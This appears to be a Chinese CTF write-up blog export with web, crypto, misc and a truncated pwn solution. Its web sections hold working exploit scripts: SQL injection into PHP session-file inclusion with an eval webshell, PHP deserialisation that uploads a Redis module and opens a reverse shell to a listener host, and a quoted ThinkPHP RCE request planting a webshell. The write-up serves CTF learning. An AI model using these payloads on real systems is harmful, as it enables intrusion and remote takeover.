查看PHPInfo</p><p>直接看源码 SQL 没做过滤，使用了 <code>password_hash()</code>对密码取 hash</p><p>构造 Payload  <code>username=&#39; UNION SELECT 1337, &#39;testuser&#39;, &#39;$2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK&#39;, &#39;&#39; -- &amp;password=passw0rd</code> 这里的 hash 即 <code>passw0rd</code>的 hash 根据登陆页面的 hint, id 取 1337 可以通过登入后的 check </p><p>登入后发现我们可以更新用户数据，参考源码 我们发现这个应用会把用户数据序列化后写入 SESSION</p><p><img src="https://i.loli.net/2021/10/05/3r61PvY8tMGQIdo.png" alt="image.png"></p><p>而且 <code>index.php</code>做了一系列的检查，但是没有过滤 session 文件，因此我们可以更新用户任意字段(密码除外)为一句话木马</p><p>结合 phpinfo(); 的结果，我们可以找到会话路径为 <code>/var/lib/php/sessions</code></p><p>即可进行会话包含。发现 flag 为 <code>/flag-&lt;随机字符&gt;</code>，<code>cat</code>下读出即可。</p><p><img src="https://i.loli.net/2021/10/06/sydojEwr7TC2bGc.png" alt="image.png"></p><p>附 EXP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="comment"># password=test&amp;username=123%27%20UNION%20SELECT%201,%27test%27,%27$2a$12$QBE87yzDmO9BEq1JWZq1eODkoVzbk6mQ0nyU400CB90Vz8SSi9b2m%27,%27%27%20+--+</span></span><br><span class="line">target = <span class="string">&quot;http://152.136.99.28:30166/&quot;</span></span><br><span class="line">session_path = <span class="string">&quot;/var/lib/php/sessions/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># passw0rd</span></span><br><span class="line"><span class="comment"># $2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&#x27; UNION SELECT 1337, &#x27;testuser&#x27;, &#x27;$2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK&#x27;, &#x27;&#x27; -- &quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;passw0rd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Trying to auth with sql injection&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = sess.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/login.php&quot;</span>, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">session_id = r.cookies.get(<span class="string">&quot;PHPSESSID&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[*] Session ID: <span class="subst">&#123;session_id&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.status_code != <span class="number">302</span>:</span><br><span class="line">    print(<span class="string">&quot;[!] Auth failure!&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;[+] Updating user info with malicious data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;passw0rd&quot;</span>,</span><br><span class="line">    <span class="comment"># Where the magic happens</span></span><br><span class="line">    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&lt;?php eval($_REQUEST[\&quot;cmd\&quot;]); ?&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = sess.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=me.php&quot;</span>, data=payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Refreshing session...&quot;</span>)</span><br><span class="line"></span><br><span class="line">sess.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=me.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;echo system(&#x27;cat /flag*&#x27;);&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>: <span class="string">f&quot;../../../../../../<span class="subst">&#123;session_path&#125;</span>/sess_<span class="subst">&#123;session_id&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = sess.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php&quot;</span>, params=params)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Getting flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Expresssssss"><a href="#Expresssssss" class="headerlink" title="Expresssssss"></a>Expresssssss</h3><p>下载附件 虽然看样子是使用了非对称密钥体制实现 JWT，但很明显，算法选错了 </p><p><img src="https://i.loli.net/2021/10/06/Hlo7amCxiwuWSdJ.png" alt="image.png"></p><p>非对称体制应当使用 <code>RS256</code>而非<code>HS256</code>，是一个很严重的错误配置，我们继续往后看</p><p><img src="https://i.loli.net/2021/10/06/h7gMXG5djwOSJae.png" alt="image.png"></p><p>serverConfig 在上文是空的，而这里需要serverConfig.isOpen 为 <code>true</code>，再加上上面的源码有对用户输入进行<code>merge</code>操作。</p><p><img src="https://i.loli.net/2021/10/06/YWhMjKirytQJfkO.png" alt="image.png"></p><p>看一下我们的 cookie 发现 PK 以及发过来了。</p><p>我们可以使用这个 PK 通过 <code>HS256</code>自己签发 JWT 进入 <code>/admin</code></p><p>这样我们不妨构造原型污染</p><p><img src="https://i.loli.net/2021/10/06/shDbwWGMNOR467L.png" alt="image.png"></p><p>替换掉cookie</p><p><img src="https://i.loli.net/2021/10/06/CzuMFya3OnB9rmd.png" alt="image.png"></p><h3 id="Happy-PHP"><a href="#Happy-PHP" class="headerlink" title="Happy PHP"></a>Happy PHP</h3><p><img src="https://i.loli.net/2021/10/06/iucs6BIWmXj38ft.png" alt="image.png"></p><p>这里需要构造反序列化</p><p>但这里对对应的字段进行了验证，我们无法通过改数量绕过<code>__wakeup()</code>，可以改变对象的大小写来绕过检测。</p><p><code>x=O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&amp;code=echo%20123;</code></p><p>可以看到回显</p><p><img src="https://i.loli.net/2021/10/06/EpSvrKDTejP2aLw.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/10/06/wZlgxsEUASqjuer.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/10/06/U3LxMngYrjhEAVa.png" alt="image.png"></p><p><code>open_base_dir</code>和<code>disable_functions</code>都给限制死了</p><p>看一下当前目录吧</p><p><img src="https://i.loli.net/2021/10/06/u97pJGHFmR38lXa.png" alt="image.png"></p><p>有个<code>.config.swp.php</code></p><p>把文件拖下来，vim 恢复下 得到 mysql 与 redis 凭据，试了下 redis 貌似好使。但貌似没法写文件。</p><p><img src="https://i.loli.net/2021/10/06/XifLGMKtxJFP3wy.png" alt="image.png"></p><p>我们不妨看看这个 redis 是否能够载入恶意 module。这里使用了 <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p>将其写入 <code>/tmp</code>目录，然后登录到 redis 载入 反弹 shell 到服务器</p><p>编写 EXP</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://152.136.99.28:30108&quot;</span></span><br><span class="line"></span><br><span class="line">redis_rce_mod = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">l_host = <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line"></span><br><span class="line">l_port = <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">code, additional=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>: <span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&#125;&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;code&quot;</span>: code,</span><br><span class="line">        <span class="string">&quot;additional&quot;</span>: additional</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(target, data=payload)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code != <span class="number">200</span>):</span><br><span class="line">        <span class="keyword">raise</span> Exception(r.text)</span><br><span class="line">    <span class="keyword">return</span> r.text[<span class="number">132</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;module.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    redis_rce_mod = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rce(<span class="string">&quot;echo &#x27;Sparta_EN&#x27;;&quot;</span>) == <span class="string">&quot;Sparta_EN&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;[*] RCE confirmed!&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Uploading malicious redis module...&quot;</span>)</span><br><span class="line"></span><br><span class="line">rce(<span class="string">&quot;file_put_contents(&#x27;/tmp/module.so&#x27;, base64_decode($_REQUEST[&#x27;additional&#x27;]));&quot;</span>, base64.b64encode(</span><br><span class="line">    redis_rce_mod).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rce(<span class="string">&quot;chmod(&#x27;/tmp/module.so&#x27;, 0777);&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Trying to trick redis load module and get a reverse shell...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">revershell_payload = <span class="string">f&quot;&quot;&quot;set_time_limit(0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$socket = socket_create(AF_INET, SOCK_STREAM, 0);</span></span><br><span class="line"><span class="string">socket_connect($socket, &quot;127.0.0.1&quot;, 6379);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$payload1 = &quot;*1\r\n$7\r\nCOMMAND\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload2 = &quot;*2\r\n$4\r\nauth\r\n$26\r\nhehe_redis_goes_brrrrrrrrr\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload3 = &quot;*3\r\n$6\r\nmodule\r\n$4\r\nload\r\n$14\r\n/tmp/module.so\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload4 = &quot;*3\r\n$10\r\nsystem.rev\r\n$<span class="subst">&#123;<span class="built_in">len</span>(l_host)&#125;</span>\r\n<span class="subst">&#123;l_host&#125;</span>\r\n$<span class="subst">&#123;<span class="built_in">len</span>(l_port)&#125;</span>\r\n<span class="subst">&#123;l_port&#125;</span>\r\n&quot;;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload1, strlen($payload1));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload2, strlen($payload2));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload3, strlen($payload3));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload4, strlen($payload4));</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(rce(revershell_payload))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Check your nc!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/06/Kx6eHQkbVXG7Yy1.png" alt="image.png"></p><p><code>cat /flag</code>发现没权限，而之前有个记录 payload 的函数有提示我们使用 readlog 查看记录。</p><p>看下 binary</p><p><img src="https://i.loli.net/2021/10/06/PUHOfbaoTFte3M1.png" alt="image.png"></p><p>是个 setuid</p><p>不妨执行下 发现可以目录穿越，读出 flag</p><p><img src="https://i.loli.net/2021/10/06/W4gTGpZsIqk2odc.png" alt="image.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EZ-Crypto"><a href="#EZ-Crypto" class="headerlink" title="EZ Crypto"></a>EZ Crypto</h3><p>仿射密码</p><p>直接上脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    x, y, u, v = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b % a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b, a, x, y, u, v = a, r, u, v, m, n</span><br><span class="line">    gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    gcd, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># modular inverse does not exist</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    C = (a*P + b) % 26</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((key[<span class="number">0</span>]*(<span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) + key[<span class="number">1</span>]) % <span class="number">26</span>)</span><br><span class="line">                        + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> text.upper().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    P = (a^-1 * (C - b)) % 26</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((modinv(key[<span class="number">0</span>], <span class="number">26</span>)*(<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - key[<span class="number">1</span>]))</span><br><span class="line">                         % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = [<span class="number">17</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;EKZZJKZZYUBBAHK&quot;</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;decrypt(c, key)&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;WELLHELLOAFFINE&#125;</code></p><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h3><p>CtfRsaTool 一把梭 <code>comfact_cn</code>可出</p><p>由于 m 中包含了 p 那么我们可以通过 求 c 与 n 的最大公约数求出 q</p><p>后面按照标准流程解密就好了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">13099786225848114426288735042622063709429417979653559902255130110659975926568234663676756524835204106945448519122951053919052978834452790083656081239724399724465813907281626036733220108031627090004400217055377991780064228481074731242267303495888888602962900043528353166689119375820829095012486469286192640858709120034967539197423507664888963829638473265043059180698438334763097949285344221617697610851153154943002108316864408271636493080517356530114745146546897588878707507824683476104289624176537904920121831095000551916845112223416432133409395056783383953717096046196532887274225485656111146665584317804803318338909</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">8559655499265896361118223899353477299042241757209602984255991793623671902400849937041183417595204298397177450326134011299326668532961582184674623363025538600270072707047163533208789053017456849333485228029982885219677656015050632558654985633574879301710404077674861745881754178023445783080693280818480184811356779954303543761230708350552871210348291625654157493398915163250634555513484314769991628473845225469274037082850635228850870120629706273968570480643866051827420679768935556198892958086984241175115383476535497399981543828236629739929537486115788597861436866044189520462578886229791185703549894677979975800817</span></span><br><span class="line"></span><br><span class="line">p = GCD(n, c)</span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">M = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">m = M // <span class="number">114514</span> // p</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;f299e536-71df-2a9c-4189-1541f4724e2b&#125;</code></p><h3 id="我大E了"><a href="#我大E了" class="headerlink" title="我大E了"></a>我大E了</h3><p>这里看到的 e 非常大，可以使用 <code>wiener</code>求d <a href="https://github.com/orisano/owiener，有了d">https://github.com/orisano/owiener，有了d</a>, n e2我们就能求出 p, q 再往后就能可以根据 RSA 的标准流程处理解密了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes, GCD</span><br><span class="line"><span class="keyword">import</span> wiener</span><br><span class="line"><span class="keyword">import</span> fractions</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/orisano/owiener</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x10001</span></span><br><span class="line">e2 = <span class="number">30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599</span></span><br><span class="line">n = <span class="number">109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141</span></span><br><span class="line">c1 = <span class="number">71583783682021619717999479268651786751161610363987881699058479972417097127681864247477848165312443269552261650281395262160728715862254920244393628296570316218768130014057719355479608374320909554953446063226545440801131248900137089609895608341522946793200814556574254250659621793341199431483521650853287065268462347854129303033847182723629092195909957117089056444411650802573134427914604925772044236086815457154819679424034812539639758661460317397185002960311032637913793371456665287379240275667317336526891584182621458450580573412613408361770289740079739848770272206592041842234862740865747628519852066267368160881640</span></span><br><span class="line">c2 = <span class="number">55494113780323304422454443648470010911900254740052633133363579960778021288760719271727939446265317907324037593785145992975447677054351886369334354944686849950347151902030735393458784973074467509096895699845403768218581207266475016330668907743203265620833738555574220981953741412558878717721926421279776436821288860990364711094386574370156520178658536435862325596193413858200565399019959529641748661306266278353593276972984410712399939855516008418931398046437081154108451462740956025357863828658378552113064369320441912407668462443383302645820142910970079821181611519951712237177739140891042508920500678667417508093499</span></span><br><span class="line"></span><br><span class="line">d2 = wiener.attack(e2, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/ius/rsatool/blob/master/rsatool.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_modulus</span>(<span class="params">n, d, e</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Efficiently recover non-trivial factors of n</span></span><br><span class="line"><span class="string">    See: Handbook of Applied Cryptography</span></span><br><span class="line"><span class="string">    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)</span></span><br><span class="line"><span class="string">    http://www.cacr.math.uwaterloo.ca/hac/</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = (e * d - <span class="number">1</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        quotient, remainder = <span class="built_in">divmod</span>(t, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">        t = quotient</span><br><span class="line"></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        a = random.randint(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt;= s <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            c1 = <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i-<span class="number">1</span>, n) * t, n)</span><br><span class="line">            c2 = <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i, n) * t, n)</span><br><span class="line"></span><br><span class="line">            found = c1 != <span class="number">1</span> <span class="keyword">and</span> c1 != (-<span class="number">1</span> % n) <span class="keyword">and</span> c2 == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># p = fractions.gcd(c1-1, n)</span></span><br><span class="line">    p = GCD(c1-<span class="number">1</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = factor_modulus(n, d2, e2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = inverse(e1, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1, d1, n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><code>flag&#123;14c78aaf-9221-1899-3a7f-0f287f3f6790&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="EZ-Traffic"><a href="#EZ-Traffic" class="headerlink" title="EZ Traffic"></a>EZ Traffic</h3><p>流量审计</p><p><img src="https://i.loli.net/2021/10/06/R64rmEy1WZbNAes.png" alt="image.png"></p><p>先看下统计 HTTP 偏多, 那就看看 HTTP 服务</p><p>看下 HTTP</p><p><img src="https://i.loli.net/2021/10/06/foxFKILSE5WJTZN.png" alt="image.png"></p><p>这几个 traffic 蛮可疑的</p><p><img src="https://i.loli.net/2021/10/06/TirEoF2bjepLSB5.png" alt="image.png"></p><p>还有一个 <code>flag.zip</code></p><p>我们不妨先把这个文件解出来 发现有密码 就继续往上看</p><p><code>config.php?cmd=xxxx</code>比较可疑 base64 解码后看不到内容 那就继续往上看</p><blockquote><p>GET /?s=index%7Cthink%5Capp%2Finvokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=file_put_contents&amp;vars%5B1%5D%5B0%5D=config.php&amp;vars%5B1%5D%5B1%5D=%3C%3Fphp+eval%28gzinflate%28base64_decode%28%24_REQUEST%5B%22cmd%22%5D%29%29%29%3B+%3F%3E HTTP/1.1<br>Host: 47.100.41.68<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Connection: keep-alive</p></blockquote><p>发现这里写了一个 <code>config.php</code> 的马 内容为 <code>&lt;?php eval(gzinflate(base64_decode($_REQUEST[&#39;cmd&#39;])));</code></p><p>所以我们还需要一个 gzinflate</p><p>下面看 response 部分 发现 包 3214 有返回 zip 的结果 我们给他的 request 解密</p><p><code>echo system(&quot;zip --password K5bi8UgMNGC97QhPHgpRrrWtYZYkoe7C flag.zip /flag&quot;);</code></p><p>解压得 flag</p><p><img src="https://i.loli.net/2021/10/06/osuF7vlwx3UMLjI.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
            <tag> reverse </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-Sept-X-浙江工业大学秋季挑战赛wp</title>
      <link href="2021/09/25/DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>2021/09/25/DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>感谢雪宝带飞，花了一天时间终于ak了pwn</p><h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p>签到题罢了</p><p>strdup函数源码如下：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut5vt0f17j61620saadq02.jpg" alt=""></p><p>可以看到strdup复制数据的时候会调用strlen函数，那么read是不会在字符串后面补00字节的，所以会泄露出栈地址</p><p>然后因为没有开NX保护，所以可执行shellcode，shellcode一把梭就完了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./bypwn&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line">        <span class="comment"># io = gdb.debug(challenge, &#x27;b 0x40082d&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25120</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 